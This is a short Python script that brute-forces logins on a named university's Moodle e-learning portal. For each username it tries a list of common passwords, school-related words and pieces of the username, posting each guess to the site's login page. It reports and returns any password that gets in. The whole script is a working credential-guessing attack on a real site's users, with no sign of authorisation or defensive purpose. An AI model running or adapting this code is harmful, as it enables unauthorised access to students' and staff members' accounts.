import requests


def brute(username):
    possible_passwords = [username, username+'0', 'ji32k7au4a83', 'au4a83',
                        '123456', '12345678', '1qaz2wsx', '12345',
                        'password', '1234567', 'abcd1234', 'qwerty',
                        'ji394su3', 'qwertyuiop', '1234', 'ndhu',
                        'NDHU', 'ndhuNDHU', 'NDHUndhu', 'elearning',
                        'Elearning', 'eLearning', 'ELEARNING']

    for i in range(4, len(username)):
        possible_passwords.append(username[:i])
        possible_passwords.append(username[i:])

    print(f"\nFor user: {username}")
    for pw in possible_passwords:
        payload = {'username': username, 'password': pw}
        with requests.Session() as s:
            p = s.post(
                'http://www.elearn.ndhu.edu.tw/moodle/login/index.php', data=payload)
            key = '<meta name="keywords" content="moodle, 東華e學苑: 登入本網站 " />'
            if key in p.text:
                print(f'wrong password: {pw}')
                s.close()
            else:
                print(f'right password: {pw}')
                s.close()
                return f"{username} {pw}"
